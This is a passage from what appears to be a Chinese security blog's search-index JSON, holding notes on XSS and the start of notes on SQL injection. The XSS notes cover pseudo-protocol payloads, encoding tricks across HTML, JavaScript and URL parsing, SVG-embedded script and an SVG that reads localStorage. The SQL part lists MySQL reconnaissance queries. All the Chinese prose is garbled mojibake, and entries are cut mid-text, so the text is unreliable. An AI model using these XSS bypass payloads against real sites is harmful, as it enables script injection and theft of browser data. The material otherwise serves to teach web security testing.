æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"5.1 ä¼ªåè®® ä¼ªåè®®ä¸åŒäºå› ç‰¹ç½‘ä¸Šæ‰€å¹¿æ³›ä½¿ç”¨çš„å¦‚ http://ã€https://ã€ftp:// åœ¨ URL ä¸­ä½¿ç”¨ï¼Œç”¨äºæ‰§è¡Œç‰¹å®šçš„åŠŸèƒ½ Data ä¼ªåè®®ï¼š data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4= JavaScript ä¼ªåè®®ï¼š javascript::alert(\"1\") ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:5:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"5.2 ç¼–ç ç»•è¿‡ 5.2.1 UNICODE ç¼–ç  ISO(å›½é™…æ ‡è°åŒ–ç»„ç»‡)åˆ¶å®šçš„åŒ…æ‹¬äº†åœ°çƒä¸Šæ‰€æœ‰æ–‡åŒ–æ‰€æœ‰å­—æ¯å’Œç¬¦å·çš„ç¼–ç ï¼Œä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ Unicode åªæ˜¯ä¸€ä¸ªç¬¦å·é›†ï¼Œå®ƒåªè§„å®šäº†ç¬¦å·çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå´æ²¡æœ‰è§„å®šè¿™ä¸ªäºŒè¿›åˆ¶ä»£ç åº”è¯¥å¦‚ä½•å­˜å‚¨ã€‚å…·ä½“å­˜å‚¨ç”±ï¼šUTF-8ï¼ŒUTF-16 ç­‰å®ç° 5.2.2 æµè§ˆå™¨è§£ç  è§£æä¸€ç¯‡ HTML æ–‡æ¡£æ—¶ä¸»è¦æœ‰ä¸‰ä¸ªå¤„ç†è¿‡ç¨‹ï¼š HTML è§£æå¹¶åˆ›å»º DOM æ ‘ï¼ŒURL è§£æå’Œ JavaScript è§£æã€‚æ¯ä¸ªè§£æå™¨è´Ÿè´£è§£ç å’Œè§£æ HTML æ–‡æ¡£ä¸­å®ƒæ‰€å¯¹åº”çš„éƒ¨åˆ†ï¼Œä¸”é¡ºåºä¹Ÿæœ‰æ‰€åŒºåˆ«ã€‚ 5.2.3 HTML è§£æè¿‡ç¨‹ 5.2.3.1 è§£æè¿‡ç¨‹ HTML æœ‰ 5 ç±»å…ƒç´ ï¼š ç©ºå…ƒç´ (Void elements)ï¼Œæœ‰ areaã€baseã€brã€colã€commandã€embedã€hrã€imgã€inputã€keygenã€linkã€metaã€paramã€sourceã€trackã€wbr ç­‰ åŸå§‹æ–‡æœ¬å…ƒç´ (Raw text elements)ï¼Œæœ‰ \u003cscript\u003e å’Œ \u003cstyle\u003e RCDATA å…ƒç´ (RCDATA elements)ï¼Œæœ‰ \u003ctextarea\u003e å’Œ \u003ctitle\u003e å¤–éƒ¨å…ƒç´ (Foreign elements)ï¼Œä¾‹å¦‚ MathML å‘½åç©ºé—´æˆ–è€… SVG å‘½åç©ºé—´çš„å…ƒç´  åŸºæœ¬å…ƒç´ (Normal elements)ï¼Œå³é™¤äº†ä»¥ä¸Š 4 ç§å…ƒç´ ä»¥å¤–çš„å…ƒç´  äº”ç±»å…ƒç´ çš„åŒºåˆ«å¦‚ä¸‹ï¼š ç©ºå…ƒç´ ï¼Œä¸èƒ½å®¹çº³ä»»ä½•å†…å®¹ï¼ˆå› ä¸ºå®ƒä»¬æ²¡æœ‰é—­åˆæ ‡ç­¾ï¼Œæ²¡æœ‰å†…å®¹èƒ½å¤Ÿæ”¾åœ¨å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾ä¸­é—´ï¼‰ã€‚ åŸå§‹æ–‡æœ¬å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€‚ RCDATA å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬å’Œå­—ç¬¦å¼•ç”¨ã€‚ å¤–éƒ¨å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATA æ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Š åŸºæœ¬å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Š HTML è§£æå™¨ä»¥çŠ¶æ€æœºçš„æ–¹å¼è¿è¡Œï¼Œå®ƒä»æ–‡æ¡£è¾“å…¥æµä¸­æ¶ˆè€—å­—ç¬¦å¹¶æ ¹æ®å…¶è½¬æ¢è§„åˆ™è½¬æ¢åˆ°ä¸åŒçš„çŠ¶æ€ã€‚ ä»¥å¦‚ä¸‹ä»£ç ä½œä¸ºç¤ºä¾‹ï¼š \u003chtml\u003e \u003cbody\u003e This is Geekby's blog \u003c/body\u003e \u003c/html\u003e åˆå§‹çŠ¶æ€ä¸º ã€ŒDataã€Stateï¼Œå½“é‡åˆ° \u003c å­—ç¬¦ï¼ŒçŠ¶æ€å˜ä¸º ã€ŒTag openã€stateï¼Œè¯»å–ä¸€ä¸ª a-z çš„å­—ç¬¦å°†äº§ç”Ÿä¸€ä¸ªå¼€å§‹æ ‡ç­¾ç¬¦å·ï¼ŒçŠ¶æ€ç›¸åº”å˜ä¸ºã€ŒTag nameã€stateï¼Œä¸€ç›´ä¿æŒè¿™ä¸ªçŠ¶æ€ç›´åˆ°è¯»å–åˆ° \u003eï¼Œæ¯ä¸ªå­—ç¬¦éƒ½é™„åŠ åˆ°è¿™ä¸ªç¬¦å·åä¸Šï¼Œä¾‹å­ä¸­åˆ›å»ºçš„æ˜¯ä¸€ä¸ª html ç¬¦å·ã€‚ å½“è¯»å–åˆ° \u003eï¼Œå½“å‰çš„ç¬¦å·å°±å®Œæˆäº†ï¼Œæ­¤æ—¶ï¼ŒçŠ¶æ€å›åˆ°ã€ŒDataã€stateï¼Œ\u003cbody\u003e æ ‡ç­¾é‡å¤è¿™ä¸€å¤„ç†è¿‡ç¨‹ã€‚æ­¤æ—¶ï¼Œhtml å’Œ body æ ‡ç­¾éƒ½è¯†åˆ«å‡ºæ¥äº†ã€‚ç°åœ¨ï¼Œå›åˆ°ã€ŒDataã€Stateï¼Œè¯»å–ã€ŒThis is Geekbyâ€™s blogã€ä¸­çš„æ¯ä¸ªå­—ç¬¦ç”Ÿæˆä¸€ä¸ªå­—ç¬¦ç¬¦å·ã€‚ è¿™æ ·ç›´åˆ°é‡åˆ° \u003c/body\u003e ä¸­çš„ \u003cã€‚ç°åœ¨ï¼Œåˆå›åˆ°äº†ã€ŒTag openã€ï¼Œè¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ /ï¼Œè¿›å…¥åˆ°ã€ŒClose tag openã€ï¼Œåˆ›å»ºä¸€ä¸ªé—­åˆæ ‡ç­¾ç¬¦å·ï¼Œå¹¶ä¸”çŠ¶æ€è½¬ç§»åˆ° ã€ŒTag nameã€stateï¼Œè¿˜æ˜¯ä¿æŒè¿™ä¸€çŠ¶æ€ï¼Œç›´åˆ°é‡åˆ° \u003eã€‚ç„¶åï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„æ ‡ç­¾ç¬¦å·å¹¶å›åˆ°ã€ŒDataã€Stateã€‚åé¢çš„é—­åˆæ ‡ç­¾å¤„ç†è¿‡ç¨‹åŒä¸Šã€‚ ä¿¡æ¯ HTML è§£æå™¨å¤„äºæ•°æ®çŠ¶æ€ï¼ˆData Stateï¼‰ã€RCDATA çŠ¶æ€ï¼ˆRCDATA Stateï¼‰ã€å±æ€§å€¼çŠ¶æ€ï¼ˆAttribute ValueStateï¼‰æ—¶ï¼Œå­—ç¬¦å®ä½“ä¼šè¢«è§£ç ä¸ºå¯¹åº”çš„å­—ç¬¦ã€‚ ç¤ºä¾‹ \u003cdiv\u003e\u0026#60;img src=x onerror=alert(4)\u0026#62;\u003c/div\u003e \u003c å’Œ \u003e è¢«ç¼–ç ä¸ºå­—ç¬¦å®ä½“ \u0026#60; å’Œ \u0026#62;ã€‚ å½“ HTML è§£æå™¨è§£æå®Œ \u003cdiv\u003e æ—¶ï¼Œä¼šè¿›å…¥æ•°æ®çŠ¶æ€å¹¶å‘å¸ƒæ ‡ç­¾ä»¤ç‰Œã€‚ æ¥ç€è§£æåˆ°å®ä½“ \u0026#60; æ—¶å› ä¸ºå¤„åœ¨æ•°æ®çŠ¶æ€,å°±ä¼šå¯¹å®ä½“è¿›è¡Œè§£ç ä¸º \u003cï¼Œ åé¢çš„ \u0026#62; åŒæ ·é“ç†è¢«è§£ç ä¸º \u003eã€‚ é—®é¢˜ è¢«è§£ç åï¼Œimg æ˜¯å¦ä¼šè¢«è§£æä¸º HTML æ ‡ç­¾è€Œå¯¼è‡´ JS æ‰§è¡Œå‘¢ï¼Ÿ å› ä¸ºè§£æå™¨åœ¨ä½¿ç”¨å­—ç¬¦å¼•ç”¨åä¸ä¼šè½¬æ¢åˆ°æ ‡ç­¾æ‰“å¼€çŠ¶æ€ï¼ˆTag Open Stateï¼‰ï¼Œä¸è¿›å…¥æ ‡ç­¾æ‰“å¼€çŠ¶æ€å°±ä¸ä¼šè¢«å‘å¸ƒä¸º HTML æ ‡ç­¾ã€‚å› æ­¤ï¼Œä¸ä¼šåˆ›å»ºæ–° HTML æ ‡ç­¾ï¼Œåªä¼šå°†å…¶ä½œä¸ºæ•°æ®æ¥å¤„ç†ã€‚ 5.2.3.2 å‡ ç§ç‰¹æ®Šæƒ…å†µ åŸå§‹æ–‡æœ¬å…ƒç´  åœ¨ HTMLä¸­ï¼Œå±äº Raw text elements çš„æ ‡ç­¾æœ‰ä¸¤ä¸ªï¼šscriptã€styleã€‚åœ¨ Raw text elements ç±»å‹æ ‡ç­¾ä¸‹çš„æ‰€æœ‰å†…å®¹å—éƒ½å±äºè¯¥æ ‡ç­¾ã€‚ Raw textelements ç±»å‹æ ‡ç­¾ä¸‹çš„æ‰€æœ‰å­—ç¬¦å®ä½“ç¼–ç éƒ½ä¸ä¼šè¢« HTML è§£ç ã€‚HTML è§£æå™¨è§£æåˆ° scriptã€style æ ‡ç­¾çš„å†…å®¹å—ï¼ˆæ•°æ®ï¼‰éƒ¨åˆ†æ—¶ï¼ŒçŠ¶æ€ä¼šè¿›å…¥ Script Data Stateï¼Œè¯¥çŠ¶æ€å¹¶ä¸åœ¨æˆ‘ä»¬å‰é¢è¯´çš„ä¼šè§£ç å­—ç¬¦å®ä½“çš„ä¸‰æ¡çŠ¶æ€ä¹‹ä¸­ã€‚ å› æ­¤ï¼Œ\u003cscript\u003e\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116\u0026#40;\u0026#57;\u0026#41;\u0026#59\u003c/script\u003e è¿™æ ·å­—ç¬¦å®ä½“å¹¶ä¸ä¼šè¢«è§£ç ï¼Œä¹Ÿå°±ä¸ä¼šæ‰§è¡Œ JSã€‚ RCDATA æƒ…å†µ åœ¨ HTMLä¸­ï¼Œå±äº RCDATA çš„æ ‡ç­¾æœ‰ä¸¤ä¸ªï¼štextareaã€titleã€‚ RCDATA Elements ç±»å‹çš„æ ‡ç­¾å¯ä»¥åŒ…å«æ–‡æœ¬å†…å®¹å’Œå­—ç¬¦å®ä½“ã€‚ è§£æå™¨è§£æåˆ° textareaã€title æ ‡ç­¾çš„æ•°æ®éƒ¨åˆ†æ—¶ï¼ŒçŠ¶æ€ä¼šè¿›å…¥ RCDATA Stateã€‚ å‰é¢æˆ‘ä»¬æåˆ°ï¼Œå¤„äº RCDATA State çŠ¶æ€æ—¶ï¼Œå­—ç¬¦å®ä½“æ˜¯ä¼šè¢«è§£æå™¨è§£ç çš„ã€‚ ç¤ºä¾‹ \u003ctextarea\u003e\u0026#60;script\u0026#62;alert(5)\u0026#60;/script\u0026#62;\u003c/textarea\u003e è§£æå™¨è§£æåˆ°å®ƒä»¬æ—¶ä¼šè¿›è¡Œè§£ç  ä½†æ˜¯é‡Œé¢çš„ JS åŒæ ·è¿˜æ˜¯ä¸ä¼šè¢«æ‰§è¡Œï¼ŒåŸå› è¿˜æ˜¯å› ä¸ºè§£ç å­—ç¬¦å®ä½“çŠ¶æ€æœºä¸ä¼šè¿›å…¥æ ‡ç­¾æ‰“å¼€çŠ¶æ€ï¼ˆTag Open Stateï¼‰ï¼Œå› æ­¤é‡Œé¢çš„ \u003cscript\u003e å¹¶ä¸ä¼šè¢«è§£æä¸º HTML æ ‡ç­¾ 5.2.4 JavaScript è§£æ å½¢å¦‚ \\uXXXX è¿™æ ·çš„ Unicode å­—ç¬¦è½¬ä¹‰åºåˆ—æˆ– Hex ç¼–ç æ˜¯å¦èƒ½è¢«è§£ç éœ€è¦çœ‹æƒ…å†µã€‚ é¦–å…ˆï¼ŒJavaScript ä¸­æœ‰ä¸‰ä¸ªåœ°æ–¹å¯ä»¥å‡ºç° Unicode å­—ç¬¦è½¬ä¹‰åºåˆ—ï¼š å­—ç¬¦ä¸²ä¸­ Unicode è½¬ä¹‰åºåˆ—å‡ºç°åœ¨å­—ç¬¦ä¸²ä¸­æ—¶ï¼Œå®ƒåªä¼šè¢«è§£é‡Šä¸ºæ™®é€šå­—ç¬¦ï¼Œè€Œä¸ä¼šç ´åå­—ç¬¦ä¸²çš„ä¸Šä¸‹æ–‡ã€‚ ä¾‹å¦‚ï¼Œ\u003cscript\u003ealert(\"\\u0031\\u0030\");\u003c/script\u003e è¢«ç¼–ç è½¬ä¹‰çš„éƒ¨åˆ†ä¸º 10ï¼Œæ˜¯å­—ç¬¦ä¸²ï¼Œä¼šè¢«æ­£å¸¸è§£ç ï¼ŒJS ä»£ç ä¹Ÿä¼šè¢«æ‰§è¡Œã€‚ æ ‡è¯†ç¬¦ä¸­ è‹¥ Unicode è½¬ä¹‰åºåˆ—å­˜åœ¨äºæ ‡è¯†ç¬¦ä¸­ï¼Œå³å˜é‡åï¼ˆå¦‚å‡½æ•°åç­‰â€¦ï¼‰ï¼Œå®ƒä¼šè¢«è¿›è¡Œè§£ç ã€‚ ä¾‹å¦‚ï¼Œ\u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(10);\u003c/script\u003e è¢«ç¼–ç è½¬ä¹‰çš„éƒ¨åˆ†ä¸º alert å­—ç¬¦ï¼Œæ˜¯å‡½æ•°åï¼Œå±äºåœ¨æ ‡è¯†ç¬¦ä¸­çš„æƒ…å†µï¼Œå› æ­¤ä¼šè¢«æ­£å¸¸è§£ç ï¼ŒJS ä»£ç ä¹Ÿä¼šè¢«æ‰§è¡Œã€‚ æ§åˆ¶å­—ç¬¦ä¸­ è‹¥ Unicode è½¬ä¹‰åºåˆ—å­˜åœ¨äºæ§åˆ¶å­—ç¬¦ä¸­ï¼Œé‚£ä¹ˆå®ƒä¼šè¢«è§£ç ä½†ä¸ä¼šè¢«è§£é‡Šä¸ºæ§åˆ¶å­—ç¬¦ï¼Œè€Œä¼šè¢«è§£é‡Šä¸ºæ ‡è¯†ç¬¦æˆ–å­—ç¬¦ä¸²å­—ç¬¦çš„ä¸€éƒ¨åˆ†ã€‚ æ§åˆ¶å­—ç¬¦å³ â€˜ã€\"ã€() ç­‰ã€‚ ä¾‹å¦‚ï¼Œ\u003cscript\u003ealert\\u0028\"xss\");\u003c/script\u003eï¼Œ( è¿›è¡Œäº† Unicode ç¼–ç ï¼Œé‚£ä¹ˆè§£ç åå®ƒä¸å†æ˜¯ä½œä¸ºæ§åˆ¶å­—ç¬¦ï¼Œè€Œæ˜¯ä½œä¸ºæ ‡è¯†ç¬¦çš„ä¸€éƒ¨åˆ†alert( ã€‚ å› æ­¤å‡½æ•°çš„æ‹¬å·ä¹‹ç±»çš„æ§åˆ¶å­—ç¬¦è¿›è¡Œ Unicode è½¬ä¹‰åæ˜¯ä¸èƒ½è¢«æ­£å¸¸è§£é‡Šçš„ã€‚ ç¤ºä¾‹ \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\u003c/script\u003e è¢«ç¼–ç éƒ¨åˆ†ä¸º alert(11)ã€‚è¯¥ä¾‹å­ä¸­çš„ JS ä¸ä¼šè¢«æ‰§è¡Œï¼Œå› ä¸ºæ§åˆ¶å­—ç¬¦è¢«ç¼–ç äº†ã€‚ \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)\u003c/script\u003e è¢«ç¼–ç éƒ¨åˆ†ä¸º alert åŠæ‹¬å·å†…ä¸º 12ã€‚è¯¥ä¾‹å­ä¸­ JS ä¸ä¼šè¢«æ‰§è¡Œï¼ŒåŸå› åœ¨äºæ‹¬å·å†…è¢«ç¼–ç çš„éƒ¨åˆ†ä¸èƒ½è¢«æ­£å¸¸è§£é‡Šï¼Œè¦ä¹ˆä½¿ç”¨ ASCII æ•°å­—ï¼Œè¦ä¹ˆåŠ  \"\" æˆ– â€™ â€™ ä½¿å…¶å˜ä¸ºå­—ç¬¦ä¸²ï¼Œä½œä¸ºå­—ç¬¦ä¸²ä¹Ÿåªèƒ½ä½œä¸ºæ™®é€šå­—ç¬¦ã€‚ \u003cscript\u003ealert('13\\u0027)\u003c/script\u003e è¢«ç¼–ç å¤„ä¸º'ã€‚è¯¥ä¾‹çš„ JS ä¸ä¼šæ‰§è¡Œï¼Œå› ä¸ºæ§åˆ¶å­—ç¬¦è¢«ç¼–ç äº†ï¼Œè§£ç åçš„ ' å°†å˜ä¸ºå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸å†è§£é‡Šä¸ºæ§åˆ¶å­—ç¬¦ã€‚å› æ­¤è¯¥ä¾‹ä¸­å­—ç¬¦ä¸²æ˜¯ä¸å®Œæ•´çš„ï¼Œå› ä¸ºæ²¡æœ‰ ' æ¥ç»“æŸå­—ç¬¦ä¸²ã€‚ \u003cscript\u003ealert('14\\u000a')\u003c/script\u003e è¯¥ä¾‹çš„ JS ä¼šè¢«æ‰§è¡Œï¼Œå› ä¸ºè¢«ç¼–ç çš„éƒ¨åˆ†å¤„äºå­—ç¬¦ä¸²å†…ï¼Œåªä¼šè¢«è§£é‡Šä¸ºæ™®é€šå­—ç¬¦ï¼Œä¸ä¼šçªç ´å­—ç¬¦ä¸²ä¸Šä¸‹æ–‡ã€‚ 5.2.5 URL è§£æ URL è§£æå™¨ä¹Ÿè¢«å»ºæ¨¡ä¸ºçŠ¶æ€æœºï¼Œæ–‡æ¡£è¾“å…¥æµä¸­çš„å­—ç¬¦å¯ä»¥å°†å…¶å¯¼å‘ä¸åŒçš„çŠ¶æ€ã€‚ é¦–å…ˆï¼Œè¦æ³¨æ„çš„æ˜¯ URL çš„åè®®éƒ¨åˆ†å¿…é¡»ä¸º ASCII å­—ç¬¦ï¼Œå³ä¸èƒ½è¢«ä»»ä½•ç¼–ç ï¼Œå¦åˆ™ URL è§£æå™¨çš„çŠ¶æ€æœºå°†è¿›å…¥ No Scheme çŠ¶æ€ã€‚ ç¤ºä¾‹ \u003ca href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"\u003e\u003c/a\u003e URL ç¼–ç éƒ¨åˆ†çš„æ˜¯ javascript:alert(1)ã€‚JS ä¸ä¼šè¢«æ‰§è¡Œï¼Œå› ä¸ºä½œä¸º Scheme éƒ¨åˆ†çš„ javascript è¿™ä¸ªå­—ç¬¦ä¸²è¢«ç¼–ç ï¼Œå¯¼è‡´ URL è§£æå™¨çŠ¶æ€æœºè¿›å…¥ No Scheme çŠ¶æ€ã€‚ URLä¸­çš„ : ä¹Ÿä¸èƒ½è¢«ä»¥ä»»ä½•æ–¹å¼ç¼–ç ï¼Œå¦åˆ™ URL è§£æå™¨çš„çŠ¶æ€æœºä¹Ÿå°†è¿›å…¥ No Scheme çŠ¶æ€ã€‚ ç¤ºä¾‹ \u003ca href=\"javascript%3aalert(3)\"\u003e\u003c/a\u003e ç”±äº : è¢«URLç¼–ç ä¸º %3aï¼Œå¯¼è‡´ URL çŠ¶æ€æœºè¿›å…¥ No Scheme çŠ¶æ€ï¼Œ JS ä»£ç ä¸èƒ½æ‰§è¡Œã€‚ ç¤ºä¾‹ \u003ca href=\"\u0026#x6a;\u0026#x61;\u0026#","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:5:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"6 HTML 5 æ–°ç‰¹æ€§åŠç›¸åº”çš„å®‰å…¨åˆ†æ ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:6:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"6.1 SVG SVG æ„ä¸ºå¯ç¼©æ”¾çŸ¢é‡å›¾å½¢ï¼Œè¿™æ˜¯ä¸€ç§ä½¿ç”¨ XML æ ¼å¼å®šä¹‰å›¾åƒçš„æ–¹å¼ SVG ä¸­çš„ JS \u003c?xml version=\"1.0\" standalone=\"no\"?\u003e \u003csvg width=\"100%\" height=\"100%\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003crect width=\"100\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)\" /\u003e \u003cscript\u003ealert(1)\u003c/script\u003e \u003c/svg\u003e å½“è®¿é—®ä¸Šé¢çš„æ–‡ä»¶å®šä¹‰çš„å›¾ç‰‡æ—¶ï¼Œä¼šå¼¹çª— åˆ©ç”¨ SVG è¿›è¡Œé’“é±¼ æ•´ä½“æµç¨‹ ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:6:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"6.2 Web Storage Web Storage åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯ session Storageï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯ localStorageã€‚ sessionStorageï¼šç”¨äºæœ¬åœ°å­˜å‚¨ä¸€ä¸ªä¼šè¯(session)ä¸­çš„æ•°æ®ï¼Œè¿™äº›æ•°æ®åªæœ‰åœ¨åŒä¸€ä¸ªä¼šè¯ä¸­çš„é¡µé¢æ‰èƒ½è®¿é—®å¹¶ä¸”å½“ä¼šè¯ç»“æŸåæ•°æ®ä¹Ÿéšä¹‹é”€æ¯ã€‚ localStorageï¼šç”¨æˆ·æŒä¹…åŒ–çš„æœ¬åœ°å­˜å‚¨ï¼Œé™¤éä¸»åŠ¨åˆ é™¤æ•°æ®ï¼Œå¦åˆ™æ•°æ®æ˜¯æ°¸è¿œä¸ä¼šè¿‡æœŸçš„ã€‚ æ–°çš„ HTML5 Web å­˜å‚¨ API ä½¿ Web å¼€å‘äººå‘˜å¯ä»¥åœ¨ç”¨æˆ·çš„è®¡ç®—æœºä¸Šå­˜å‚¨å¤§çº¦ 5 å…†å­—èŠ‚çš„æ•°æ®(è€Œ Cookie ä¸­ä»…å…è®¸ 4KB çš„æ•°æ®)ã€‚ åˆ©ç”¨ SVG ç›—å– localStorage \u003c?xml version=\"1.0\" standalone=\"no\"?\u003e \u003csvg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" \u003e \u003crect width=\"100\" height=\"100\" /\u003e \u003cscript\u003e if(localStorage.length) { for(key in localStorage) { if(localStorage.getItem(key)) { console.log(key); console.log(localStorage.getItem(key)); } } } \u003c/script\u003e \u003c/svg\u003e ","date":"2021-01-10","objectID":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:6:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"XSS æ¼æ´ç›¸å…³","uri":"/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"SQLæ³¨å…¥ç›¸å…³","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1 æ•°æ®åº“ç›¸å…³ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.1 å®šä¹‰ æ•°æ®åº“æ˜¯ä¸€ä¸ªå­˜å‚¨æ•°æ®çš„ä»“åº“ï¼Œ ä»¥ä¸€å®šæ–¹å¼å­˜å‚¨åœ¨ä¸€èµ·ã€èƒ½ä¸å¤šä¸ªç”¨æˆ·å…±äº«ã€å…·æœ‰å°½å¯èƒ½å°çš„å†—ä½™åº¦ï¼Œä¸åº”ç”¨ç¨‹åºå½¼æ­¤ç‹¬ç«‹çš„æ•°æ®é›†åˆ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:1:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.2 åˆ†ç±» å…³ç³»å‹æ•°æ®åº“ - SQL ç±»ä¼¼è¡¨æ ¼ï¼Œè¡¨ä¸è¡¨ä¹‹å‰å­˜åœ¨å¤æ‚çš„å…³ç³» MySQLã€SQLServer ç­‰ éå…³ç³»å‹æ•°æ®åº“ - NoSQL Key - Value å½¢å¼ï¼Œç®€åŒ–æ•°æ®åº“ç»“æ„ã€é¿å…å†—ä½™ã€‚ MangoDBã€Redisã€memcached ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:1:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.3 åŸºæœ¬æ“ä½œ æŸ¥çœ‹æ•°æ®åº“ show databases(); ä½¿ç”¨æ•°æ®åº“ use information_schema æŸ¥çœ‹å½“å‰ä½¿ç”¨æ•°æ®åº“ select database(); æŸ¥çœ‹æ•°æ®è¡¨ show tables(); æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ select version(); ä½¿ç”¨å½“å‰æ•°æ®åº“çš„ç”¨æˆ· select user(); æŸ¥çœ‹æ•°æ®åº“è·¯å¾„ select @@datadir æŸ¥çœ‹å®‰è£…è·¯å¾„ select @@basedir æŸ¥çœ‹ç³»ç»Ÿç±»å‹ select @@version_compile_os ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:1:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.4 å…ƒæ•°æ®è¡¨ - information_schema information_schema æ˜¯ä¿¡æ¯æ•°æ®åº“å…¶ä¸­ä¿å­˜ç€å…³äº MySQL 